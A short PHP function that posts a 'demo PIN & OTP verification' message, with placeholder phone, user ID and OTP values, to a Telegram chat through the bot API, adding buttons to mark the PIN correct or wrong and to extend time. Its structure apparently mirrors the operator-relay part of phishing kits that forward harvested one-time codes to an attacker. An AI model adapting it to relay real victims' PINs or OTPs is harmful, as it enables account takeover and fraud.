<?php
function send_demo_message() {
    $token = getenv("TELEGRAM_BOT_TOKEN");
    $chat = getenv("TELEGRAM_CHAT_ID");
    if (!$token || !$chat) return;

    $text = "🔐 DEMO PIN & OTP VERIFICATION\n\n"
          . "USER DETAILS:\n"
          . "• Demo Phone: 0700000000\n"
          . "• Demo User ID: demo_123456\n"
          . "• Time: ".date("d/m/Y, H:i:s")."\n"
          . "• Bot: demo_bot\n\n"
          . "━━━━━━━━━━━━━━━━\n\n"
          . "VERIFY THE DEMO:\n"
          . "• PIN Length: 4 digits\n"
          . "• OTP 1: 111111\n"
          . "• OTP 2: 222222\n"
          . "• Status: DEMO\n\n"
          . "━━━━━━━━━━━━━━━━\n\n"
          . "🟢 Correct Demo PIN & OTP\n"
          . "🔴 Wrong Demo PIN\n\n"
          . "⏱ Extend Time";

    $keyboard = ["inline_keyboard"=>[
        [["text"=>"🟢 Correct Demo PIN & OTP","callback_data"=>"demo_correct"],
         ["text"=>"🔴 Wrong Demo PIN","callback_data"=>"demo_wrong"]],
        [["text"=>"⏱ Extend Time","callback_data"=>"demo_extend"]]
    ]];

    $ch = curl_init("https://api.telegram.org/bot".rawurlencode($token)."/sendMessage");
    curl_setopt_array($ch,[CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>http_build_query([
        "chat_id"=>$chat,"text"=>$text,"reply_markup"=>json_encode($keyboard)
    ]),CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>10]);
    curl_exec($ch); curl_close($ch);
}
?>